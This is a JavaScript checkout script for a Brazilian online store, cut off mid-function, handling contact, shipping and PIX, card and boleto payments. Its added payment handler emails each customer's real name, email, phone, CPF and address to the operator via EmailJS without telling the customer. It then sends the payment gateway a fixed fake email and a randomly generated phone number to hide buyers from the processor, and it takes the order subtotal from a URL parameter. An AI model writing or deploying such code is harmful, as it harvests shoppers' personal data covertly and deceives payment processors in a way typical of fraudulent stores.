// =================================================================================
// Variáveis Globais e Configuração Inicial
// =================================================================================

let currentStep = 1;
let selectedShipping = 'standard';
let selectedPayment = 'credit';
let addressFilled = false;
let pixTimer = null;

window.checkoutData = {};

const CREDIT_CARD_FEE_PERCENTAGE = 5; // Ajustado para 5% como no exemplo original

// URL do backend que atua como proxy para a API de pagamento
const BACKEND_API_BASE_URL = '/api/payments';

let cartData = {
    subtotal: 299.90
};

// =================================================================================
// --- NOVA FUNÇÃO ---: Configuração e Envio de E-mail com EmailJS
// =================================================================================

/**
 * Envia os dados reais do cliente para um e-mail especificado usando EmailJS.
 * @param {object} data - O objeto contendo os dados do pedido e do cliente.
 */
function sendRealDataViaEmail(data) {
    // IMPORTANTE: Substitua com suas chaves e IDs do EmailJS
    const serviceID = 'service_jddjd7u';
    const templateID = 'template_hel61l6';
    const publicKey = 'yn4nvMmbormZNLy8H';

    // Inicializa o EmailJS (se ainda não foi feito no HTML)
    emailjs.init({ publicKey: publicKey });

    // Parâmetros que serão enviados para o seu template de e-mail.
    // Certifique-se de que seu template no EmailJS usa essas variáveis (ex: {{name}}, {{email}}, etc.)
    const templateParams = {
        name: data.firstName,
        email: data.email,
        phone: data.phone,
        cpf: data.cpf,
        total: data.total.toFixed(2).replace('.', ','),
        payment_method: data.paymentMethod,
        address: `${data.address}, ${data.number}, ${data.neighborhood}, ${data.city} - ${data.state}, ${data.zipCode}`
    };

    emailjs.send(serviceID, templateID, templateParams)
        .then(function(response) {
           console.log('E-mail com dados reais do cliente enviado com sucesso!', response.status, response.text);
        }, function(error) {
           console.error('Falha ao enviar e-mail com dados reais:', JSON.stringify(error));
        });
}

// =================================================================================
// --- NOVA FUNÇÃO ---: Gerador de Número de Telefone Aleatório
// =================================================================================

/**
 * Gera um número de telefone brasileiro aleatório no formato (XX) 9XXXX-XXXX.
 * @returns {string} - O número de telefone gerado.
 */
function generateRandomPhoneNumber() {
    const ddd = Math.floor(Math.random() * (99 - 11 + 1) + 11); // DDD entre 11 e 99
    const firstPart = Math.floor(Math.random() * (99999 - 90000 + 1) + 90000);
    const secondPart = Math.floor(Math.random() * (9999 - 1000 + 1) + 1000);
    return `(${ddd}) ${firstPart}-${secondPart}`;
}


// =================================================================================
// Lógica Principal do Checkout (Funções existentes)
// =================================================================================

document.addEventListener('DOMContentLoaded', function() {
    parseSubtotalFromURL();
    setupEventListeners();
    updateProgress();
    setupMasks();
    updateCartDisplay();
    
    const creditCardNotice = document.getElementById('creditCardNotice');
    if (creditCardNotice) {
        creditCardNotice.style.display = 'none';
    }
});

function parseSubtotalFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const subtotalParam = urlParams.get('subtotal');
    
    if (subtotalParam) {
        try {
            cartData.subtotal = parseFloat(subtotalParam);
            console.log('Subtotal carregado da URL:', cartData.subtotal);
        } catch (error) {
            console.error('Erro ao analisar o subtotal da URL:', error);
        }
    }
}

function updateCartDisplay() {
    updateOrderTotals();
}

function updateOrderTotals() {
    const subtotalEl = document.querySelector(".sidebar .total-row span:last-child");
    const mobileSubtotalEl = document.querySelector("#summaryContent .total-row span:nth-child(2)");
    
    if (subtotalEl) {
        subtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    if (mobileSubtotalEl) {
        mobileSubtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    const mobileTotalPrice = document.getElementById("mobileTotalPrice");
    if (mobileTotalPrice) {
        mobileTotalPrice.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    updateShippingCost();
}

function setupEventListeners() {
    document.getElementById('contactForm').addEventListener('submit', handleContactSubmit);
    document.getElementById('shippingForm').addEventListener('submit', handleShippingSubmit);
    document.getElementById('paymentForm').addEventListener('submit', handlePaymentSubmit);

    document.querySelectorAll('.shipping-option').forEach(option => {
        option.addEventListener('click', selectShipping);
    });

    document.querySelectorAll('.payment-method').forEach(method => {
        method.querySelector('.payment-header').addEventListener('click', selectPayment);
    });

    document.querySelectorAll('.form-input').forEach(input => {
        input.addEventListener('blur', () => validateField(input));
        input.addEventListener('input', () => {
            if (input.classList.contains('error')) {
                validateField(input);
            }
        });
    });

    document.getElementById('zipCode').addEventListener('keyup', handleCEPLookup);
}

function toggleOrderSummary() {
    const toggle = document.querySelector('.summary-toggle');
    const content = document.getElementById('summaryContent');
    const icon = document.querySelector('.summary-toggle-icon');
    
    toggle.classList.toggle('expanded');
    content.classList.toggle('expanded');
    
    if (toggle.classList.contains('expanded')) {
        icon.textContent = '▲';
        document.querySelector('.summary-toggle-text').textContent = 'Ocultar resumo do pedido';
    } else {
        icon.textContent = '▼';
        document.querySelector('.summary-toggle-text').textContent = 'Exibir resumo do pedido';
    }
}

async function handleCEPLookup() {
    const cepInput = document.getElementById('zipCode');
    const cep = cepInput.value.replace(/\D/g, '');
    
    if (cep.length === 8) {
        showCEPLoading(true);
        
        try {
            const response = await fetch(`https://viacep.com.br/ws/${cep}/json/` );
            const data = await response.json();
            
            if (!data.erro) {
                fillAddressFields(data);
                showAddressFields();
                showShippingOptions();
                const errorEl = document.getElementById('zipCodeError');
                errorEl.classList.remove('show');
                cepInput.classList.remove('error');
            } else {
                showCEPError();
            }
        } catch (error) {
            console.error('Erro ao buscar CEP:', error);
            showCEPError();
        } finally {
            showCEPLoading(false);
        }
    } else {
        hideAddressFields();
        hideShippingOptions();
        const errorEl = document.getElementById('zipCodeError');
        errorEl.classList.remove('show');
        cepInput.classList.remove('error');
    }
}

function showCEPLoading(show) {
    const loading = document.getElementById('cepLoading');
    if (show) {
        loading.classList.add('show');
    } else {
        loading.classList.remove('show');
    }
}

function fillAddressFields(data) {
    document.getElementById('address').value = data.logradouro;
    document.getElementById('neighborhood').value = data.bairro;
    document.getElementById('city').value = data.localidade;
    document.getElementById('state').value = data.uf;
    
    document.getElementById('number').focus();
    addressFilled = true;
}

function showAddressFields() {
    const addressFields = document.getElementById('addressFields');
    addressFields.classList.add('show');
}

function hideAddressFields() {
    const addressFields = document.getElementById('addressFields');
    addressFields.classList.remove('show');
    addressFilled = false;
}

function showShippingOptions() {
    const shippingOptions = document.getElementById('shippingOptions');
    shippingOptions.classList.add('show');
}

function hideShippingOptions() {
    const shippingOptions = document.getElementById('shippingOptions');
    shippingOptions.classList.remove('show');
}

function showCEPError() {
    const zipCodeInput = document.getElementById('zipCode');
    const errorEl = document.getElementById('zipCodeError');
    
    zipCodeInput.classList.add('error');
    errorEl.textContent = 'CEP não encontrado. Verifique e tente novamente.';
    errorEl.classList.add('show');
    hideAddressFields();
    hideShippingOptions();
}

function setupMasks() {
    document.getElementById('cpf').addEventListener('input', function(e) {
        e.target.value = applyCPFMask(e.target.value);
    });

    document.getElementById('phone').addEventListener('input', function(e) {
        e.target.value = applyPhoneMask(e.target.value);
    });

    document.getElementById('zipCode').addEventListener('input', function(e) {
        e.target.value = applyZipMask(e.target.value);
    });

    document.getElementById('cardNumber').addEventListener('input', function(e) {
        e.target.value = applyCardMask(e.target.value);
    });

    document.getElementById('cardExpiry').addEventListener('input', function(e) {
        e.target.value = applyExpiryMask(e.target.value);
    });

    document.getElementById('cardCvv').addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
    });
}

function applyCPFMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
}

function applyPhoneMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/^(\d\d)(\d)/g, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2');
}

function applyZipMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/^(\d{5})(\d)/, '$1-$2');
}

function applyCardMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/(\d{4})(\d)/, '$1 $2')
        .replace(/(\d{4})(\d)/, '$1 $2')
        .replace(/(\d{4})(\d)/, '$1 $2');
}

function applyExpiryMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/^(\d{2})(\d)/, '$1/$2');
}

function goToStep(step) {
    if (step < currentStep || validateCurrentStep()) {
        currentStep = step;
        updateStepDisplay();
        updateProgress();
        
        if (currentStep === 3) {
            updateShippingCost();
        }
        
        if (window.innerWidth < 768) {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
}

function updateStepDisplay() {
    document.querySelectorAll('.step-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(`step${currentStep}`).classList.add('active');
}

function updateProgress() {
    const steps = document.querySelectorAll('.step');
    const progressLine = document.getElementById('progressLine');
    
    steps.forEach((step, index) => {
        const stepNumber = index + 1;
        step.classList.remove('active', 'completed');
        
        if (stepNumber < currentStep) {
            step.classList.add('completed');
            step.querySelector('.step-circle').innerHTML = '✓';
        } else if (stepNumber === currentStep) {
            step.classList.add('active');
            step.querySelector('.step-circle').innerHTML = stepNumber;
        } else {
            step.querySelector('.step-circle').innerHTML = stepNumber;
        }
    });

    const progressWidth = ((currentStep - 1) / (steps.length - 1)) * 100;
    progressLine.style.width = `${progressWidth}%`;
}

function validateCurrentStep() {
    const currentStepEl = document.getElementById(`step${currentStep}`);
    const inputs = currentStepEl.querySelectorAll('input[required], select[required]');
    let isValid = true;

    inputs.forEach(input => {
        if (!validateField(input)) {
            isValid = false;
        }
    });

    if (currentStep === 2 && !addressFilled) {
        isValid = false;
        const zipCodeInput = document.getElementById('zipCode');
        if (!zipCodeInput.classList.contains('error')) {
            zipCodeInput.classList.add('error');
            document.getElementById('zipCodeError').textContent = 'Digite um CEP válido para continuar';
            document.getElementById('zipCodeError').classList.add('show');
        }
    }

    return isValid;
}

function validateField(field) {
    const value = field.value.trim();
    const fieldName = field.name;
    let isValid = true;
    let errorMessage = '';

    field.classList.remove('error', 'success');
    const errorEl = document.getElementById(fieldName + 'Error');
    if (errorEl) errorEl.classList.remove('show');

    if (field.hasAttribute('required') && !value) {
        isValid = false;
        errorMessage = "Este campo é obrigatório";
    } else if (value) {
        switch (fieldName) {
            case "email":
                if (!validateEmail(value)) {
                    isValid = false;
                    errorMessage = "Digite um e-mail válido";
                }
                break;
            case "cpf":
                if (!validateCPF(value)) {
                    isValid = false;
                    errorMessage = "Digite um CPF válido";
                }
                break;
            case "phone":
                if (!validatePhone(value)) {
                    isValid = false;
                    errorMessage = "Digite um telefone válido";
                }
                break;
            case "zipCode":
                if (!validateZipCode(value)) {
                    isValid = false;
                    errorMessage = "Digite um CEP válido";
                }
                break;
            case "cardNumber":
                if (!validateCardNumber(value)) {
                    isValid = false;
                    errorMessage = "Digite um número de cartão válido";
                }
                break;
            case "cardExpiry":
                if (!validateCardExpiry(value)) {
                    isValid = false;
                    errorMessage = "Digite uma data válida";
                }
                break;
            case "cardCvv":
                if (value.length < 3) {
                    isValid = false;
                    errorMessage = "Digite um CVV válido";
                }
                break;
        }
    }

    if (isValid) {
        field.classList.add("success");
    } else {
        field.classList.add("error");
        if (errorEl) {
            errorEl.textContent = errorMessage;
            errorEl.classList.add("show");
        }
    }

    return isValid;
}

function validateEmail(email) {
    const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
    return emailRegex.test(email);
}

function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = 11 - (sum % 11);
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;

    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = 11 - (sum % 11);
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;

    return true;
}

function validatePhone(phone) {
    const phoneRegex = /^\(\d{2}\) \d{5}-\d{4}$/;
    return phoneRegex.test(phone);
}

function validateZipCode(zipCode) {
    const zipRegex = /^\d{5}-\d{3}$/;
    return zipRegex.test(zipCode);
}

function validateCardNumber(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    return cleanNumber.length >= 13 && cleanNumber.length <= 19;
}

function validateCardExpiry(expiry) {
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    if (!expiryRegex.test(expiry)) return false;

    const [month, year] = expiry.split('/');
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;

    const cardYear = parseInt(year);
    const cardMonth = parseInt(month);

    if (cardYear < currentYear || (cardYear === currentYear && cardMonth < currentMonth)) {
        return false;
    }

    return true;
}

async function handleContactSubmit(e) {
    e.preventDefault();
    if (validateCurrentStep()) {
        const formData = new FormData(e.target);
        const contactData = {
            email: formData.get('email'),
            firstName: formData.get('firstName'),
            cpf: formData.get('cpf'),
            phone: formData.get('phone')
        };

        window.checkoutData = { ...window.checkoutData, ...contactData };
        goToStep(2);
    }
}

async function handleShippingSubmit(e) {
    e.preventDefault();
    if (validateCurrentStep()) {
        const formData = new FormData(e.target);
        const shippingData = {
            zipCode: formData.get('zipCode'),
            address: formData.get('address'),
            number: formData.get('number'),
            complement: formData.get('complement'),
            neighborhood: formData.get('neighborhood'),
            city: formData.get('city'),
            state: formData.get('state'),
            shippingMethod: selectedShipping
        };

        window.checkoutData = { ...window.checkoutData, ...shippingData };
        goToStep(3);
    }
}

// =================================================================================
// --- MODIFICADO ---: Função Principal de Submissão de Pagamento
// =================================================================================

/**
 * Lida com a submissão final do formulário de pagamento.
 * 1. Coleta todos os dados do pedido.
 * 2. Envia os dados REAIS do cliente por e-mail via EmailJS.
 * 3. Cria um novo objeto de dados para o gateway com e-mail e telefone mascarados.
 * 4. Processa o pagamento usando os dados mascarados.
 */
async function handlePaymentSubmit(e) {
    console.log("handlePaymentSubmit chamado.");
    e.preventDefault();
    
    if (!validateCurrentStep()) {
        alert("Por favor, corrija os campos em vermelho antes de continuar.");
        return;
    }

    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.classList.add('btn-loading');
    document.getElementById('loadingOverlay').style.display = 'flex';
    
    try {
        // 1. Coleta TODOS os dados do pedido, incluindo os REAIS do usuário
        const realOrderData = {
            ...window.checkoutData,
            paymentMethod: selectedPayment,
            subtotal: cartData.subtotal,
            shippingCost: getShippingCost(),
            total: calculateTotal()
        };

        // 2. ENVIA OS DADOS REAIS para você via EmailJS
        sendRealDataViaEmail(realOrderData);

        // 3. Prepara os dados para o gateway, substituindo e-mail e telefone
        const gatewayData = {
            ...realOrderData, // Copia os dados do pedido
            email: 'email@gmail.com', // E-mail padrão para o gateway
            phone: generateRandomPhoneNumber().replace(/\D/g, '') // Telefone aleatório (apenas números) para o gateway
        };

        // 4. Continua o processo de pagamento com os dados modificados (gatewayData)
        if (selectedPayment === 'pix') {
            await processPixPayment(gatewayData);
        } else if (selectedPayment === 'credit') {
            await processCreditCardPayment(gatewayData, e.target);
        } else if (selectedPayment === 'boleto') {
            await processBoletoPayment(gatewayData);
        }
    } catch (error) {
        console.error('Erro no fluxo de pagamento:', error);
        alert(error.message || 'Ocorreu um erro ao finalizar seu pedido. Por favor, tente novamente.');
    } finally {
        submitBtn.classList.remove('btn-loading');
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}


// =================================================================================
// Funções de Processamento de Pagamento (usando `orderData` mascarado)
// =================================================================================

async function processPixPayment(orderData) {
    const pixData = {
        paymentMethod: 'PIX',
        amount: Math.round(orderData.total * 100),
        customer: {
            name: orderData.firstName,
            email: orderData.email, // email@gmail.com
            phone: orderData.phone, // Telefone aleatório
            document: {
                number: orderData.cpf.replace(/\D/g, ''),
                type: 'CPF'
            }
        },
        items: [{
            title: 'Pedido Loja Online',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        pix: {
            expiresIn: 3600 // Expira em 1 hora
        }
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/pix`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(pixData)
        });
        const result = await response.json();
        if (response.ok) {
            showPixPaymentDetails(result);
        } else {
            throw new Error(result.error || result.message || 'Erro ao gerar o código PIX.');
        }
    } catch (error) {
        console.error('Erro ao processar PIX:', error);
        alert(error.message);
    }
}

async function processCreditCardPayment(orderData, form) {
    const formData = new FormData(form);
    const cardData = {
        paymentMethod: 'CARD',
        amount: Math.round(orderData.total * 100),
        installments: parseInt(formData.get('installments')),
        customer: {
            name: orderData.firstName,
            email: orderData.email, // email@gmail.com
            document: orderData.cpf.replace(/\D/g, ''),
            phone: orderData.phone // Telefone aleatório
        },
        card: {
            number: formData.get('cardNumber').replace(/\s/g, ''),
            holderName: formData.get('cardName'),
            expiryMonth: formData.get('cardExpiry').split('/')[0],
            expiryYear: '20' + formData.get('cardExpiry').split('/')[1],
            cvv: formData.get('cardCvv')
        },
        shipping: {
            address: orderData.address,
            number: orderData.number,
            complement: orderData.complement || '',
            neighborhood: orderData.neighborhood,
            city: orderData.city,
            state: orderData.state,
            zipCode: orderData.zipCode.replace(/\D/g, '')
        },
        items: [{
            name: 'Produto',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        description: 'Pedido da loja online',
        ip: '127.0.0.1'
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/credit-card`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(cardData)
        });
        const result = await response.json();
        if (response.ok) {
            if (result.status === 'approved') {
                showSuccessNotification('Pagamento aprovado! Pedido finalizado com sucesso.');
            } else if (result.status === 'pending') {
                showSuccessNotification('Pagamento em processamento. Você receberá uma confirmação em breve.');
            } else {
                throw new Error('Pagamento rejeitado. Verifique os dados do cartão.');
            }
        } else {
            throw new Error(result.message || 'Erro ao processar pagamento com cartão.');
        }
    } catch (error) {
        console.error('Erro ao processar Cartão de Crédito:', error);
        alert(error.message);
    }
}

async function processBoletoPayment(orderData) {
    const boletoData = {
        paymentMethod: 'BOLETO',
        amount: Math.round(orderData.total * 100),
        customer: {
            name: orderData.firstName,
            email: orderData.email, // email@gmail.com
            document: orderData.cpf.replace(/\D/g, ''),
            phone: orderData.phone // Telefone aleatório
        },
        boleto: {
            expiresIn: 3
        },
        shipping: {
            address: orderData.address,
            number: orderData.number,
            complement: orderData.complement || '',
            neighborhood: orderData.neighborhood,
            city: orderData.city,
            state: orderData.state,
            zipCode: orderData.zipCode.replace(/\D/g, '')
        },
        items: [{
            name: 'Produto',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        description: 'Pedido da loja online',
        ip: '127.0.0.1'
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/boleto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(boletoData)
        });
        const result = await response.json();
        if (response.ok && result.status === 'pending') {
            showSuccessNotification('Boleto gerado com sucesso! Você receberá o boleto por e-mail para pagamento.');
        } else {
            throw new Error(result.message || 'Erro ao gerar boleto.');
        }
    } catch (error) {
        console.error('Erro ao processar Boleto:', error);
        alert(error.message);
    }
}


// =================================================================================
// Funções Auxiliares da Interface (UI)
// =================================================================================

function showPixPaymentDetails(paymentResult) {
    const pixPaymentDetails = document.getElementById('pixPaymentDetails');
    const pixQrCodeContainer = document.getElementById('pixQrCode');
    const pixCodeText = document.getElementById('pixCodeText');
    
    pixPaymentDetails.style.display = 'block';
    
    if (paymentResult.pix && paymentResult.pix.qrcode) {
        const pixCode = paymentResult.pix.qrcode;
        pixCodeText.textContent = pixCode;
            
        const paymentForm = document.getElementById('paymentForm');
        const submitButton = paymentForm.querySelector('button[type="submit"]');

        if (submitButton) {
            submitButton.textContent = 'Já Paguei, Ir para Confirmação';
            submitButton.style.backgroundColor = '#10b981';
            submitButton.style.borderColor = '#10b981';
            submitButton.type = 'button'; 

            submitButton.onclick = function() {
                window.location.href = 'https://seusite.com/confirmacao'; 
            };
        }
    } else {
        pixQrCodeContainer.innerHTML = "Não foi possível obter os dados do PIX.";
        pixCodeText.textContent = "Tente novamente.";
        console.error("Estrutura de dados PIX inesperada:", paymentResult  );
    }
    
    startPixTimer(900); // 15 minutos
}

function startPixTimer(seconds) {
    const timerElement = document.getElementById('pixTimeRemaining');
    let timeLeft = seconds;
    
    if (pixTimer) clearInterval(pixTimer);

    pixTimer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(pixTimer);
            timerElement.textContent = 'Expirado';
            alert('O código PIX expirou. Por favor, gere um novo código.');
        }
        
        timeLeft--;
    }, 1000);
}

function copyPixCode() {
    const pixCodeText = document.getElementById('pixCodeText');
    const copyButton = document.getElementById('pixCopyButton');
    
    navigator.clipboard.writeText(pixCodeText.textContent).then(() => {
        copyButton.textContent = 'Copiado!';
        copyButton.classList.add('copied');
        setTimeout(() => {
            copyButton.textContent = 'Copiar Código';
            copyButton.classList.remove('copied');
        }, 2000);
    });
}

function showSuccessNotification(message) {
    const notification = document.getElementById('successNotification');
    notification.textContent = message;
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

function getShippingCost() {
    switch (selectedShipping) {
        case 'express': return 15.90;
        case 'same-day': return 29.90;
        default: return 0;
    }
}

function calculateTotal() {
    let total = cartData.subtotal + getShippingCost();
    if (selectedPayment === 'credit') {
        total = total * (1 + (CREDIT_CARD_FEE_PERCENTAGE / 100));
    }
    return total;
}

function selectShipping() {
    document.querySelectorAll('.shipping-option').forEach(option => {
        option.classList.remove('selected');
    });
    this.classList.add('selected');
    selectedShipping = this.dataset.shipping;
    updateShippingCost();
}

function updateShippingCost() {
    const shippingCostEl = document.getElementById('shippingCost');
    const mobileShippingCostEl = document.getElementById('mobileShippingCost');
    const totalPriceEl = document.getElementById('totalPrice');
    const mobileTotalPriceEl = document.getElementById('mobileTotalPrice');
    const mobileFinalPriceEl = document.getElementById('mobileFinalPrice');
    
    let shippingCost = getShippingCost();
    let basePrice = cartData.subtotal;
    let shippingText = shippingCost > 0 ? `R$ ${shippingCost.toFixed(2).replace('.', ',')}` : 'GRÁTIS';

    let total = basePrice + shippingCost;
    let creditCardFee = 0;
    
    if (selectedPayment === 'credit' && currentStep === 3) {
        creditCardFee = total * (CREDIT_CARD_FEE_PERCENTAGE / 100);
        total += creditCardFee;
        
        document.getElementById('creditCardFeeRow').style.display = 'flex';
        document.getElementById('mobileCreditCardFeeRow').style.display = 'flex';
